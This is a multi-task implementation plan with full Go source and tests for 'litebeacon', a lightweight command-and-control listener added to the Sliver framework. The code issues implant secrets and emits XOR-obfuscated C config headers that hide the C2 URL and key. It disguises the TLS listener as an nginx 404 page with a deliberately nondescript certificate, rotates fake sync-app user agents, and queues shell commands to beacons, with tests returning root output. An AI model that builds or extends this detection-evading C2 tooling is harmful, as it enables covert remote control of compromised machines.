- Modify: `server/litebeacon/secrets.go`（补全注册表）
- Create: `server/litebeacon/configgen.go`
- Create: `server/litebeacon/secrets_test.go`

**Interfaces:**
- Consumes: `SecretEntry`、`jsonKeyPool`（Task 2）。
- Produces: `SecretsPath(rootAppDir string) string`、`LoadSecrets(path string) (*SecretRegistry, error)`、`(*SecretRegistry) Issue(label string) (SecretEntry, error)`、`(*SecretRegistry) Latest() (SecretEntry, bool)`、`(*SecretRegistry) List() []SecretEntry`、`(*SecretRegistry) Entries() []SecretEntry`、`ConfigParams`、`GenerateConfigH(ConfigParams) (string, error)`、`userAgentPool`、`RandomUserAgent() string`（Task 5/6 依赖）。

- [ ] **Step 1: 写失败测试**

`server/litebeacon/secrets_test.go`:

```go
package litebeacon

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestLoadSecretsIssuesDefault(t *testing.T) {
	path := filepath.Join(t.TempDir(), "lite", "secrets.json")
	reg, err := LoadSecrets(path)
	if err != nil {
		t.Fatal(err)
	}
	if len(reg.List()) != 1 {
		t.Fatalf("want 1 default secret, got %d", len(reg.List()))
	}
	if _, err := os.Stat(path); err != nil {
		t.Fatal("secrets file not persisted")
	}
	entry, ok := reg.Latest()
	if !ok || entry.KeyName == "" || len(entry.SecretB64) != 44 {
		t.Fatalf("bad default entry: %#v", entry)
	}
}

func TestIssueAppendsAndPersists(t *testing.T) {
	path := filepath.Join(t.TempDir(), "secrets.json")
	reg, err := LoadSecrets(path)
	if err != nil {
		t.Fatal(err)
	}
	first, _ := reg.Latest()
	second, err := reg.Issue("console")
	if err != nil {
		t.Fatal(err)
	}
	if second.SecretB64 == first.SecretB64 {
		t.Fatal("secrets must differ")
	}
	reloaded, err := LoadSecrets(path)
	if err != nil {
		t.Fatal(err)
	}
	entries := reloaded.List()
	if len(entries) != 2 || entries[1].SecretB64 != second.SecretB64 {
		t.Fatalf("reload lost entries: %#v", entries)
	}
}

func TestSecretB64DecodesTo32Bytes(t *testing.T) {
	reg, err := LoadSecrets(filepath.Join(t.TempDir(), "secrets.json"))
	if err != nil {
		t.Fatal(err)
	}
	entry, _ := reg.Latest()
	secret, err := base64.StdEncoding.DecodeString(entry.SecretB64)
	if err != nil || len(secret) != 32 {
		t.Fatalf("bad secret encoding: %q", entry.SecretB64)
	}
}

func TestGenerateConfigH(t *testing.T) {
	reg, _ := LoadSecrets(filepath.Join(t.TempDir(), "secrets.json"))
	entry, _ := reg.Latest()
	text, err := GenerateConfigH(ConfigParams{
		URL:             "https://c2.example.com:8443/api/v2/sync",
		SecretB64:       entry.SecretB64,
		KeyName:         entry.KeyName,
		UserAgent:       "AppSync/2.4.1 (Linux x86_64)",
		BaseIntervalSec: 180,
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"#define CFG_XOR", "#define CFG_URL_LEN", "CFG_URL[", "CFG_KEY[32]",
		"#define CFG_INTERVAL 180", "#define LITE_CONFIG_H",
	} {
		if !strings.Contains(text, want) {
			t.Fatalf("config.h missing %q", want)
		}
	}
	if strings.Contains(text, "c2.example.com") {
		t.Fatal("config.h must not contain the plaintext URL")
	}
	if strings.Contains(text, entry.SecretB64) {
		t.Fatal("config.h must not contain the plaintext secret")
	}
}

func TestGenerateConfigHRejectsBadSecret(t *testing.T) {
	_, err := GenerateConfigH(ConfigParams{URL: "https://x/", SecretB64: "zz", KeyName: "data", UserAgent: "ua"})
	if err == nil {
		t.Fatal("expected error for bad secret")
	}
}

func TestRandomUserAgent(t *testing.T) {
	if RandomUserAgent() == "" {
		t.Fatal("user agent pool empty")
	}
	if len(userAgentPool) < 4 {
		t.Fatalf("pool too small: %d", len(userAgentPool))
	}
}
```

// 注意：`SecretEntry.SecretB64` 统一为 base64(32 字节)（`openBody` 按此解码）。控制台展示与 config.h 生成用同一个字段，全链路不得出现第二个字段名。

- [ ] **Step 2: 运行确认失败**

Run: `go test -tags=server,go_sqlite ./server/litebeacon`
Expected: FAIL（`LoadSecrets` 未定义）

- [ ] **Step 3: 写实现**

`server/litebeacon/secrets.go`（替换 Task 2 的最小版）:

```go
package litebeacon

import (
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"sync"
	"time"
)

// SecretEntry pairs a build-time shared secret with its JSON envelope key name.
type SecretEntry struct {
	SecretB64 string    `json:"secret"` // base64(32 bytes)
	KeyName  string    `json:"key"`
	CreatedAt time.Time `json:"created"`
	Label    string    `json:"label"`
}

var jsonKeyPool = []string{"data", "token", "payload", "blob", "value"}

// SecretRegistry persists every issued secret; old secrets stay valid so
// already-deployed implants keep working after rotation.
type SecretRegistry struct {
	mutex   sync.Mutex
	path    string
	entries []SecretEntry
}

func SecretsPath(rootAppDir string) string {
	return filepath.Join(rootAppDir, "litebeacon", "secrets.json")
}

func LoadSecrets(path string) (*SecretRegistry, error) {
	reg := &SecretRegistry{path: path}
	if data, err := os.ReadFile(path); err == nil {
		if err := json.Unmarshal(data, &reg.entries); err != nil {
			return nil, err
		}
	} else if !os.IsNotExist(err) {
		return nil, err
	}
	if len(reg.entries) == 0 {
		if _, err := reg.Issue("default"); err != nil {
			return nil, err
		}
	}
	return reg, nil
}

func (r *SecretRegistry) Issue(label string) (SecretEntry, error) {
	r.mutex.Lock()
	defer r.mutex.Unlock()
	secret := randomBytes(32)
	entry := SecretEntry{
		SecretB64: base64.StdEncoding.EncodeToString(secret),
		KeyName:   jsonKeyPool[len(r.entries)%len(jsonKeyPool)],
		CreatedAt: time.Now().UTC(),
		Label:     label,
	}
	r.entries = append(r.entries, entry)
	if err := r.save(); err != nil {
		return SecretEntry{}, err
	}
	return entry, nil
}

func (r *SecretRegistry) save() error {
	if err := os.MkdirAll(filepath.Dir(r.path), 0o700); err != nil {
		return err
	}
	data, err := json.MarshalIndent(r.entries, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(r.path, data, 0o600)
}

func (r *SecretRegistry) Latest() (SecretEntry, bool) {
	r.mutex.Lock()
	defer r.mutex.Unlock()
	if len(r.entries) == 0 {
		return SecretEntry{}, false
	}
	return r.entries[len(r.entries)-1], true
}

func (r *SecretRegistry) List() []SecretEntry {
	r.mutex.Lock()
	defer r.mutex.Unlock()
	out := make([]SecretEntry, len(r.entries))
	copy(out, r.entries)
	return out
}

// Entries is the decrypt candidate list used by openBody.
func (r *SecretRegistry) Entries() []SecretEntry {
	return r.List()
}
```

`server/litebeacon/configgen.go`:

```go
package litebeacon

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"strings"
)

var userAgentPool = []string{
	"AppSync/2.4.1 (Windows NT 10.0; Win64; x64)",
	"CloudSync-Agent/1.8.2",
	"FileSync/3.1.0 (Windows NT 10.0)",
	"AppSync/2.4.1 (Linux x86_64)",
	"cloud-sync/1.8.2",
	"DeviceSync/2.0.7 (Linux x86_64)",
}

// RandomUserAgent picks a coherent non-browser UA for the build.
func RandomUserAgent() string {
	return userAgentPool[rand.Intn(len(userAgentPool))]
}

type ConfigParams struct {
	URL             string
	SecretB64       string
	KeyName         string
	UserAgent       string
	BaseIntervalSec uint32
}

// GenerateConfigH renders the XOR-obfuscated C config header. Plain strings
// must never appear in the emitted header.
func GenerateConfigH(p ConfigParams) (string, error) {
	secret, err := base64.StdEncoding.DecodeString(p.SecretB64)
	if err != nil || len(secret) != 32 {
		return "", fmt.Errorf("bad secret")
	}
	if p.URL == "" || p.KeyName == "" || p.UserAgent == "" {
		return "", fmt.Errorf("empty config field")
	}
	if p.BaseIntervalSec == 0 {
		p.BaseIntervalSec = 180
	}
	xk := randomBytes(1)[0]
	var b strings.Builder
	fmt.Fprintf(&b, "#ifndef LITE_CONFIG_H\n#define LITE_CONFIG_H\n\n")
	fmt.Fprintf(&b, "/* generated by the console — do not commit */\n\n")
	fmt.Fprintf(&b, "#define CFG_XOR 0x%02x\n\n", xk)
	writeArr(&b, "CFG_URL", []byte(p.URL), xk)
	fmt.Fprintf(&b, "\n")
	writeArr(&b, "CFG_KEY", secret, xk)
	fmt.Fprintf(&b, "\n")
	writeArr(&b, "CFG_JSON_KEY", []byte(p.KeyName), xk)
	fmt.Fprintf(&b, "\n")
	writeArr(&b, "CFG_UA", []byte(p.UserAgent), xk)
	fmt.Fprintf(&b, "\n#define CFG_INTERVAL %d\n\n", p.BaseIntervalSec)
	fmt.Fprintf(&b, "#endif\n")
	return b.String(), nil
}

func writeArr(b *strings.Builder, name string, value []byte, xk byte) {
	fmt.Fprintf(b, "#define %s_LEN %d\nstatic const unsigned char %s[%d] = {", name, len(value), name, len(value))
	for i, c := range value {
		if i > 0 {
			b.WriteString(",")
		}
		fmt.Fprintf(b, "0x%02x", c^xk)
	}
	b.WriteString("};\n")
}
```

- [ ] **Step 4: 跑测试通过**

Run: `go test -tags=server,go_sqlite ./server/litebeacon`
Expected: PASS（全部）

- [ ] **Step 5: gofmt + 提交**

```bash
git add server/litebeacon/secrets.go server/litebeacon/configgen.go server/litebeacon/secrets_test.go
git commit --no-verify -m "feat(litebeacon): 密钥登记与 config.h 生成"
```

---

### Task 5: TLS 监听器与单例管理

**Files:**
- Create: `server/litebeacon/listener.go`
- Create: `server/litebeacon/manager.go`
- Create: `server/litebeacon/listener_test.go`

**Interfaces:**
- Consumes: 前四个任务的全部产物。
- Produces: `ListenerConfig{Host string; Port int; Path string}`、`Start(ListenerConfig, *Store, *SecretRegistry) (*Listener, error)`、`(*Listener) Stop() error`、`(*Listener) Addr() net.Addr`、`DefaultPath`、`ConfigInfo`、`StartDefault(host string, port int, path, externalURL string) (string, error)`、`StopDefault() error`、`GetConfig() (ConfigInfo, error)`、`NewConfig(label string) (ConfigInfo, error)`、`ListBeacons() []Beacon`、`DeleteBeacon(id string)`、`QueueTask(id string, t Task) (Task, bool)`、`TakeResults(id string) []Result`（Task 6 依赖）。

- [ ] **Step 1: 写失败测试**

`server/litebeacon/listener_test.go`:

```go
package litebeacon

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"io"
	"net/http"
	"path/filepath"
	"testing"
	"time"
)

func startTestListener(t *testing.T) (*Listener, *Store, *SecretRegistry, SecretEntry) {
	t.Helper()
	t.Setenv("SLIVER_ROOT_DIR", t.TempDir())
	secrets, err := LoadSecrets(filepath.Join(t.TempDir(), "secrets.json"))
	if err != nil {
		t.Fatal(err)
	}
	entry, ok := secrets.Latest()
	if !ok {
		t.Fatal("no secret")
	}
	store := NewStore()
	lis, err := Start(ListenerConfig{Host: "127.0.0.1", Port: 0}, store, secrets)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = lis.Stop() })
	return lis, store, secrets, entry
}

func postCheckin(t *testing.T, addr, path string, entry SecretEntry, plain []byte) (*http.Response, []byte) {
	t.Helper()
	key := deriveKey(mustSecret(t, entry))
	body, err := sealBody(entry.KeyName, key, plain)
	if err != nil {
		t.Fatal(err)
	}
	client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}} //nolint:gosec
	resp, err := client.Post("https://"+addr+path, "application/json", bytes.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	data, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	return resp, data
}

func mustSecret(t *testing.T, entry SecretEntry) []byte {
	t.Helper()
	secret, err := base64.StdEncoding.DecodeString(entry.SecretB64)
	if err != nil || len(secret) != 32 {
		t.Fatalf("bad secret entry: %#v", entry)
	}
	return secret
}

// postRaw sends an already-sealed JSON envelope verbatim (for replay tests).
func postRaw(t *testing.T, addr string, body []byte) *http.Response {
	t.Helper()
	client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}} //nolint:gosec
	resp, err := client.Post("https://"+addr+DefaultPath, "application/json", bytes.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	return resp
}

func TestListenerFullRoundTrip(t *testing.T) {
	lis, store, secrets, entry := startTestListener(t)
	addr := lis.Addr().String()
	now := uint64(time.Now().Unix())

	// hello check-in
	hello := encodeTLVs([]tlv{
		{Type: tlvBeaconID, Value: []byte("roundtrip-id-01")},
		{Type: tlvTimestamp, Value: u64b(now)},
		{Type: tlvHostname, Value: []byte("box")},
		{Type: tlvOS, Value: []byte("Linux 5.10")},
		{Type: tlvArch, Value: []byte("amd64")},
		{Type: tlvUsername, Value: []byte("root")},
		{Type: tlvPID, Value: u32b(1)},
	})
	resp, data := postCheckin(t, addr, DefaultPath, entry, hello)
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("hello status %d body %s", resp.StatusCode, data)
	}
	beacons := store.ListBeacons()
	if len(beacons) != 1 || beacons[0].Info.Hostname != "box" {
		t.Fatalf("beacon not registered: %#v", beacons)
	}

	// queue a task, expect it delivered on the next check-in
	if _, ok := store.QueueTask("roundtrip-id-01", Task{Type: TaskExec, Cmd: "id", TimeoutSec: 10}); !ok {
		t.Fatal("queue failed")
	}
	resp, data = postCheckin(t, addr, DefaultPath, entry, encodeTLVs([]tlv{
		{Type: tlvBeaconID, Value: []byte("roundtrip-id-01")},
		{Type: tlvTimestamp, Value: u64b(uint64(time.Now().Unix()))},
	}))
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("poll status %d", resp.StatusCode)
	}
	plain, _, _, err := openBody(data, secrets.Entries())
	if err != nil {
		t.Fatalf("response envelope: %v (%s)", err, data)
	}
	items, err := decodeTLVs(plain)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, it := range items {
		if it.Type == TaskExec && binary.LittleEndian.Uint32(it.Value[0:4]) == 1 && string(it.Value[6:]) == "id" {
			found = true
		}
	}
	if !found {
		t.Fatalf("task not delivered: %#v", items)
	}

	// deliver an exec result, read it via the store
	postCheckin(t, addr, DefaultPath, entry, encodeTLVs([]tlv{
		{Type: tlvBeaconID, Value: []byte("roundtrip-id-01")},
		{Type: tlvTimestamp, Value: u64b(uint64(time.Now().Unix()))},
		{Type: tlvExecRes, Value: append(append(u32b(1), u32b(0)...), []byte("uid=0(root)")...)},
	}))
	results := store.TakeResults("roundtrip-id-01")
	if len(results) != 1 || results[0].Kind != "exec" || string(results[0].Output) != "uid=0(root)" {
		t.Fatalf("results: %#v", results)
	}
}

func TestListenerCamouflage(t *testing.T) {
	lis, _, _, entry := startTestListener(t)
	addr := lis.Addr().String()
	client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}} //nolint:gosec

	// GET → nginx-style 404 page
	resp, err := client.Get("https://" + addr + "/api/v2/sync")
	if err != nil {
		t.Fatal(err)
	}
	page, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusNotFound || !bytes.Contains(page, []byte("nginx")) {
		t.Fatalf("GET cover page wrong: %d %s", resp.StatusCode, page)
	}

	// wrong path POST → 404 page
	body, _ := sealBody(entry.KeyName, deriveKey(mustSecret(t, entry)), []byte("x"))
	resp, err = client.Post("https://"+addr+"/other", "application/json", bytes.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusNotFound {
		t.Fatalf("wrong path status %d", resp.StatusCode)
	}

	// bad secret → 404 page
	forged := randomBytes(32)
	body, _ = sealBody("data", deriveKey(forged), []byte("x"))
	resp, err = client.Post("https://"+addr+DefaultPath, "application/json", bytes.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusNotFound {
		t.Fatalf("forged secret status %d", resp.StatusCode)
	}

	// replay → 404
	now := uint64(time.Now().Unix())
	plain := encodeTLVs([]tlv{
		{Type: tlvBeaconID, Value: []byte("replay-01")},
		{Type: tlvTimestamp, Value: u64b(now)},
	})
	// replay → 404：构造一次 seal 的原始密文体原样重发（重新 seal 会换 nonce，测不出重放）
	sealed, err := sealBody(entry.KeyName, deriveKey(mustSecret(t, entry)), plain)
	if err != nil {
		t.Fatal(err)
	}
	if resp := postRaw(t, addr, sealed); resp.StatusCode != http.StatusOK {
		t.Fatalf("first check-in failed: %d", resp.StatusCode)
	}
	if resp := postRaw(t, addr, sealed); resp.StatusCode != http.StatusNotFound {
		t.Fatalf("replay must be rejected with 404, got %d", resp.StatusCode)
	}

	// stale timestamp → 404
	stale := encodeTLVs([]tlv{
		{Type: tlvBeaconID, Value: []byte("stale-01")},
		{Type: tlvTimestamp, Value: u64b(now - 3600)},
	})
	resp, _ = postCheckin(t, addr, DefaultPath, entry, stale)
	resp.Body.Close()
	if resp.StatusCode != http.StatusNotFound {
		t.Fatalf("stale timestamp must be rejected, got %d", resp.StatusCode)
	}
}

func TestExitTaskDeletesBeacon(t *testing.T) {
	lis, store, _, entry := startTestListener(t)
	addr := lis.Addr().String()
	beaconID := "exit-01"
	now := uint64(time.Now().Unix())
	resp, _ := postCheckin(t, addr, DefaultPath, entry, encodeTLVs([]tlv{
		{Type: tlvBeaconID, Value: []byte(beaconID)},
		{Type: tlvTimestamp, Value: u64b(now)},
	}))
	resp.Body.Close()
	_, _ = store.QueueTask(beaconID, Task{Type: TaskExit})
	resp, data := postCheckin(t, addr, DefaultPath, entry, encodeTLVs([]tlv{
		{Type: tlvBeaconID, Value: []byte(beaconID)},
		{Type: tlvTimestamp, Value: u64b(uint64(time.Now().Unix()))},
	}))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("exit delivery status %d body %s", resp.StatusCode, data)
	}
	if beacons := store.ListBeacons(); len(beacons) != 0 {
		t.Fatalf("exit task must remove beacon: %#v", beacons)
	}
}
```

`u64b/u32b/u32` 已在 proto_test.go 定义（同包测试共享）。

- [ ] **Step 2: 运行确认失败**

Run: `go test -tags=server,go_sqlite ./server/litebeacon`
Expected: FAIL（`Start` 未定义）

- [ ] **Step 3: 写实现**

`server/litebeacon/listener.go`:

```go
package litebeacon

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/bishopfox/sliver/server/assets"
)

const (
	// DefaultPath is the innocuous check-in endpoint path.
	DefaultPath = "/api/v2/sync"
	maxBodyLen  = 4 << 20
)

// nginxCoverPage mimics a stock nginx "not found" response so the port looks
// like an ordinary web server to anyone probing it.
const nginxCoverPage = `<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>
`

type ListenerConfig struct {
	Host string
	Port int
	Path string
}

type Listener struct {
	store   *Store
	secrets *SecretRegistry
	path    string
	server  *http.Server
	ln      net.Listener
}

func (l *Listener) Addr() net.Addr { return l.ln.Addr() }

// Start binds the TLS listener. The certificate is a boring self-signed pair
// stored under ~/.sliver/litebeacon — intentionally not the Sliver cert CA.
func Start(cfg ListenerConfig, store *Store, secrets *SecretRegistry) (*Listener, error) {
	path := cfg.Path
	if path == "" {
		path = DefaultPath
	}
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	certPEM, keyPEM, err := ensureTLSCert()
	if err != nil {
		return nil, err
	}
	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return nil, err
	}
	l := &Listener{store: store, secrets: secrets, path: path}
	// 不用 http.ServeMux：它对未清洗路径（//x、/a/../b）会在进 handler 前回 301，
	// 绕过 nginx 封面 → 指纹口子。直接挂 handler，路径判断由 handler 自己做。
	l.server = &http.Server{
		Handler:           http.HandlerFunc(l.handler),
		ReadHeaderTimeout: 15 * time.Second,
		TLSConfig:         &tls.Config{Certificates: []tls.Certificate{cert}},
	}
	ln, err := net.Listen("tcp", net.JoinHostPort(cfg.Host, fmt.Sprint(cfg.Port)))
	if err != nil {
		return nil, err
	}
	l.ln = ln
	go func() {
		_ = l.server.ServeTLS(ln, "", "")
	}()
	return l, nil
}

func (l *Listener) Stop() error {
	return l.server.Close()
}

func (l *Listener) notFound(w http.ResponseWriter) {
	w.Header().Set("Server", "nginx")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusNotFound)
	_, _ = w.Write([]byte(nginxCoverPage))
}

func (l *Listener) handler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost || r.URL.Path != l.path {
		l.notFound(w)
		return
	}
	if r.ContentLength > maxBodyLen {
		l.notFound(w)
		return
	}
	body, err := io.ReadAll(io.LimitReader(r.Body, maxBodyLen))
	if err != nil {
		l.notFound(w)
		return
	}
	plain, matched, nonce, err := openBody(body, l.secrets.Entries())
	if err != nil {
		l.notFound(w)
		return
	}
	ci, err := parseCheckin(plain)
	if err != nil {
		l.notFound(w)
		return
	}
	now := time.Now()
	skew := now.Sub(time.Unix(int64(ci.TS), 0))
	if skew > maxClockSkew || skew < -maxClockSkew {
		l.notFound(w)
		return
	}
	if l.store.Touch(ci.BeaconID, nonce, ci.Info, matched.SecretB64, now) {
		l.notFound(w) // replay
		return
	}
	l.store.PushResults(ci.BeaconID, ci.Execs, ci.Files, now)
	tasks := l.store.TakeTasks(ci.BeaconID)
	for _, task := range tasks {
		if task.Type == TaskExit {
			defer l.store.Delete(ci.BeaconID)
		}
	}
	payload, err := buildTaskPayload(tasks, 1+int(randomBytes(1)[0]))
	if err != nil {
		l.notFound(w)
		return
	}
	respBody, err := sealBody(matched.KeyName, deriveKey(mustSecretBytes(matched.SecretB64)), payload)
	if err != nil {
		l.notFound(w)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(respBody)
}

func mustSecretBytes(secretB64 string) []byte {
	secret, err := base64.StdEncoding.DecodeString(secretB64)
	if err != nil || len(secret) != 32 {
		return make([]byte, 32)
	}
	return secret
}

func tlsCertPaths() (string, string) {
	dir := filepath.Join(assets.GetRootAppDir(), "litebeacon")
	return filepath.Join(dir, "tls.pem"), filepath.Join(dir, "tls.key")
}

// ensureTLSCert loads or creates a plain self-signed cert. Boring subject on
// purpose: no Sliver subject randomization fingerprints.
func ensureTLSCert() (certPEM, keyPEM []byte, err error) {
	certPath, keyPath := tlsCertPaths()
	if cert, cerr := os.ReadFile(certPath); cerr == nil {
		if key, kerr := os.ReadFile(keyPath); kerr == nil {
			return cert, key, nil
		}
	}
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, nil, err
	}
	tmpl := x509.Certificate{
		SerialNumber: big.NewInt(time.Now().Unix()),
		Subject:      pkix.Name{CommonName: "www", Organization: []string{"web"}},
		NotBefore:    time.Now().Add(-24 * time.Hour),
		NotAfter:     time.Now().Add(10 * 365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	der, err := x509.CreateCertificate(rand.Reader, &tmpl, &tmpl, &priv.PublicKey, priv)
	if err != nil {
		return nil, nil, err
	}
	certPEM = pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
	keyPEM = pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
	if err := os.MkdirAll(filepath.Dir(certPath), 0o700); err != nil {
		return nil, nil, err
	}
	if err := os.WriteFile(certPath, certPEM, 0o600); err != nil {
		return nil, nil, err
	}
	if err := os.WriteFile(keyPath, keyPEM, 0o600); err != nil {
		return nil, nil, err
	}
	return certPEM, keyPEM, nil
}
```

注意：`mustSecretBytes` 内用 `encoding/base64`，listener.go 需要 import `"encoding/base64"`。

`server/litebeacon/manager.go`:

```go
package litebeacon

import (
	"fmt"
	"net"
	"strconv"
	"strings"
	"sync"

	"github.com/bishopfox/sliver/server/assets"
)

const defaultIntervalSec = 180

var (
	mgrMutex   sync.Mutex
	mgrStore   *Store
	mgrSecrets *SecretRegistry
	mgrLis     *Listener
	mgrURL     string
	mgrPath    = DefaultPath
)

func defaultManager() (*Store, *SecretRegistry, error) {
	if mgrStore == nil {
		secrets, err := LoadSecrets(SecretsPath(assets.GetRootAppDir()))
		if err != nil {
			return nil, nil, err
		}
		mgrStore = NewStore()
		mgrSecrets = secrets
	}
	return mgrStore, mgrSecrets, nil
}

// StartDefault starts (or replaces) the singleton console-managed listener.
func StartDefault(host string, port int, path, externalURL string) (string, error) {
	mgrMutex.Lock()
	defer mgrMutex.Unlock()
	_, _, err := defaultManager()
	if err != nil {
		return "", err
	}
	if mgrLis != nil {
		_ = mgrLis.Stop()
		mgrLis = nil
	}
	if host == "" {
		host = "0.0.0.0"
	}
	// port == 0 让系统分配临时端口（测试用）；控制台表单默认给 8443
	lis, err := Start(ListenerConfig{Host: host, Port: port, Path: path}, mgrStore, mgrSecrets)
	if err != nil {
		return "", err
	}
	mgrLis = lis
	mgrPath = lis.path
	if externalURL == "" {
		display := host
		if display == "0.0.0.0" || display == "::" {
			display = "127.0.0.1"
		}
		portHint := port
		if portHint == 0 {
			_, boundPort, splitErr := net.SplitHostPort(lis.Addr().String())
			if splitErr == nil {
				portHint, _ = strconv.Atoi(boundPort)
			}
		}
		externalURL = fmt.Sprintf("https://%s", net.JoinHostPort(display, fmt.Sprint(portHint)))
	}
	mgrURL = strings.TrimSuffix(externalURL, "/")
	return lis.Addr().String(), nil
}

func StopDefault() error {
	mgrMutex.Lock()
	defer mgrMutex.Unlock()
	if mgrLis == nil {
		return fmt.Errorf("lite listener not running")
	}
	err := mgrLis.Stop()
	mgrLis = nil
	return err
}

// ConfigInfo is the console-facing build configuration for the C implant.
type ConfigInfo struct {
	Running   bool   `json:"running"`
	Addr      string `json:"addr"`
	URL       string `json:"url"`
	SecretB64 string `json:"secretB64"`
	ConfigH   string `json:"configH"`
}

func currentURL() string {
	if mgrURL != "" {
		return mgrURL + mgrPath
	}
	return "https://127.0.0.1:8443" + DefaultPath
}

func buildInfo(entry SecretEntry) (ConfigInfo, error) {
	cfgH, err := GenerateConfigH(ConfigParams{
		URL:             currentURL(),
		SecretB64:       entry.SecretB64,
		KeyName:         entry.KeyName,
		UserAgent:       RandomUserAgent(),
		BaseIntervalSec: defaultIntervalSec,
	})
	if err != nil {
		return ConfigInfo{}, err
	}
	info := ConfigInfo{URL: currentURL(), SecretB64: entry.SecretB64, ConfigH: cfgH}
	if mgrLis != nil {
		info.Running = true
		info.Addr = mgrLis.Addr().String()
	}
	return info, nil
}

// GetConfig returns build info for the latest secret without issuing a new one.
func GetConfig() (ConfigInfo, error) {
	mgrMutex.Lock()
	defer mgrMutex.Unlock()
	_, secrets, err := defaultManager()
	if err != nil {
		return ConfigInfo{}, err
	}
	entry, ok := secrets.Latest()
	if !ok {
		return ConfigInfo{}, fmt.Errorf("no secrets")
	}
	return buildInfo(entry)
}

// NewConfig issues a fresh secret (old ones stay valid) and returns its build info.
func NewConfig(label string) (ConfigInfo, error) {
	mgrMutex.Lock()
	defer mgrMutex.Unlock()
	_, secrets, err := defaultManager()
	if err != nil {
		return ConfigInfo{}, err
	}
	entry, err := secrets.Issue(label)
	if err != nil {
		return ConfigInfo{}, err
	}
	return buildInfo(entry)
}

func ListBeacons() []Beacon {
	mgrMutex.Lock()
	defer mgrMutex.Unlock()
	if mgrStore == nil {
		return nil
	}
	return mgrStore.ListBeacons()
}

func DeleteBeacon(id string) {
	mgrMutex.Lock()
	defer mgrMutex.Unlock()
	if mgrStore != nil {
		mgrStore.Delete(id)
	}
}

func QueueTask(id string, t Task) (Task, bool) {
	mgrMutex.Lock()
	defer mgrMutex.Unlock()
	if mgrStore == nil {
		return t, false
	}
	return mgrStore.QueueTask(id, t)
}

func TakeResults(id string) []Result {
	mgrMutex.Lock()
	defer mgrMutex.Unlock()
	if mgrStore == nil {
		return nil
	}
	return mgrStore.TakeResults(id)
}
```

- [ ] **Step 4: 跑测试通过**

Run: `go test -tags=server,go_sqlite ./server/litebeacon`
Expected: PASS

- [ ] **Step 5: gofmt + 提交**

```bash
git add server/litebeacon/listener.go server/litebeacon/manager.go server/litebeacon/listener_test.go
git commit --no-verify -m "feat(litebeacon): TLS 监听器与控制台单例管理"
```

---

### Task 6: Web API 接入

**Files:**
- Create: `server/web/lite.go`
- Modify: `server/web/server.go`（Handler() 注册路由）
- Modify: `server/web/api_test.go`（新增 lite API 测试）

**Interfaces:**
- Consumes: Task 5 manager 全部导出函数、现有 `decodeJSON`/`writeErr`/`writeJSON`/`rpcErr`。
- Produces: `/api/lite/listener/start`、`/api/lite/listener/stop`、`/api/lite/config`（GET 取最新/POST 签发新）、`/api/lite/beacons`、`/api/lite/beacon/delete`、`/api/lite/task`、`/api/lite/results`（Task 7 UI 依赖）。

- [ ] **Step 1: 写失败测试**

追加到 `server/web/api_test.go` 末尾：

```go
func TestLiteAPIs(t *testing.T) {
	t.Setenv("SLIVER_ROOT_DIR", t.TempDir())
	svc := NewService("test-token")
	server := httptest.NewServer(svc.Handler())
	defer server.Close()

	// start listener on an ephemeral port
	res := postJSON(t, server.URL+"/api/lite/listener/start", `{"host":"127.0.0.1","port":0}`, "test-token")
	defer res.Body.Close()
	if res.StatusCode != http.StatusOK {
		t.Fatalf("start status %d", res.StatusCode)
	}
	var startBody map[string]any
	if err := json.NewDecoder(res.Body).Decode(&startBody); err != nil {
		t.Fatal(err)
	}
	if startBody["addr"] == "" {
		t.Fatalf("missing addr: %#v", startBody)
	}

	// config contains an obfuscated config.h and a secret
	res2, err := apiGet(t, server.URL+"/api/lite/config", "test-token")
	if err != nil {
		t.Fatal(err)
	}
	defer res2.Body.Close()
	var cfg map[string]any
	if err := json.NewDecoder(res2.Body).Decode(&cfg); err != nil {
		t.Fatal(err)
	}
	cfgH, _ := cfg["configH"].(string)
